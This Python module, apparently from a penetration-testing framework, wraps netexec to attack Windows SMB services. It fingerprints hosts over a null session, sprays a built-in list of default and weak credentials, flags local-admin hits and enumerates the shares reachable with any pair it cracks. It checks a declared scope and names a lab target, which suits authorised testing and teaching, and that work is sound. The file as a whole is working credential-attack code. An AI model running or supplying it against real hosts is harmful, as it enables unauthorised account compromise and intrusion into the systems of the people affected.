"""Windows credential attacks over SMB via netexec (nxc).

Capability B of the roadmap: on a Windows host SMB is usually the only real
surface, and the realistic way in is weak/default/reused credentials, not a
memory-corruption RCE. This tool does three things, all scope-checked:

- fingerprint the SMB service over a null session (OS, signing, SMBv1, null
  auth) — recon, always safe;
- spray a small credential set with `--local-auth --continue-on-success` and
  report every valid pair, flagging local-admin hits (nxc's "Pwn3d!");
- on a valid pair, list the shares it can reach (read-only impact evidence).

Refuses any target outside the declared scope, like every other tool.
"""

import os
import re
import subprocess
import tempfile

from scope import load_scope, is_in_scope

# Small built-in credential set for the lab: common Windows accounts and weak /
# default passwords (incl. Metasploitable3's vagrant). Kept tiny so a spray is
# fast and does not risk lockouts; the operator can grow it later via wordlists.
BUILTIN_USERS = ["Administrator", "vagrant", "admin", "user"]
BUILTIN_PASSWORDS = ["vagrant", "Password123!", "password", "admin", "P@ssw0rd", "123456"]


def _nxc_smb(args, timeout):
    """Run `nxc smb <args>` and return combined stdout+stderr, or a note on
    timeout. nxc prints results to stdout and progress to stderr."""
    try:
        result = subprocess.run(
            ["nxc", "smb", *args],
            capture_output=True, text=True, timeout=timeout,
        )
        return (result.stdout or "") + (result.stderr or "")
    except subprocess.TimeoutExpired:
        return f"nxc smb timed out after {timeout}s."
    except FileNotFoundError:
        return "nxc (netexec) is not installed."


def nxc_smb_info(target, scope_file):
    """Null-session fingerprint of the SMB service. Returns the raw nxc line(s)
    or None if the target is out of scope."""
    if not is_in_scope(target, load_scope(scope_file)):
        return None
    return _nxc_smb([target, "-u", "", "-p", ""], timeout=60)


# A successful nxc SMB login line looks like:
#   SMB  192.168.1.220  445  WIN-LAB-VULN  [+] WIN-LAB-VULN\Administrator:vagrant (Pwn3d!)
_CRED_RE = re.compile(r"\[\+\]\s+\S+?\\([^:]+):(.*?)(?:\s+\((Pwn3d!)\))?\s*$")


def parse_nxc_creds(output):
    """Pull valid credential pairs out of nxc spray output. Returns a list of
    dicts {user, password, admin} with no duplicates, preserving order."""
    creds = []
    seen = set()
    for line in (output or "").splitlines():
        if "[+]" not in line:
            continue
        m = _CRED_RE.search(line.rstrip())
        if not m:
            continue
        user, password, pwn = m.group(1), m.group(2), m.group(3)
        key = (user.lower(), password)
        if key in seen:
            continue
        seen.add(key)
        creds.append({"user": user, "password": password, "admin": bool(pwn)})
    return creds


def nxc_smb_spray(target, scope_file, users=None, passwords=None):
    """Spray credentials against SMB (local auth). Returns (raw_output, creds)
    where creds is parse_nxc_creds(raw_output), or (None, []) if out of scope."""
    if not is_in_scope(target, load_scope(scope_file)):
        return None, []
    users = users or BUILTIN_USERS
    passwords = passwords or BUILTIN_PASSWORDS
    ufile = tempfile.NamedTemporaryFile("w", suffix=".txt", delete=False)
    pfile = tempfile.NamedTemporaryFile("w", suffix=".txt", delete=False)
    ufile.write("\n".join(users) + "\n")
    pfile.write("\n".join(passwords) + "\n")
    ufile.close()
    pfile.close()
    try:
        # --local-auth: authenticate against the host's local SAM (standalone
        # server, not a domain). --continue-on-success: find every valid pair,
        # not just the first. Bounded timeout for a small list.
        out = _nxc_smb(
            [target, "-u", ufile.name, "-p", pfile.name,
             "--local-auth", "--continue-on-success"],
            timeout=max(60, 8 * len(users) * len(passwords)),
        )
        return out, parse_nxc_creds(out)
    finally:
        os.unlink(ufile.name)
        os.unlink(pfile.name)


def nxc_smb_shares(target, scope_file, user, password):
    """List the shares a valid credential can reach (read-only). Returns raw
    nxc output or None if out of scope."""
    if not is_in_scope(target, load_scope(scope_file)):
        return None
    return _nxc_smb(
        [target, "-u", user, "-p", password, "--local-auth", "--shares"],
        timeout=60,
    )
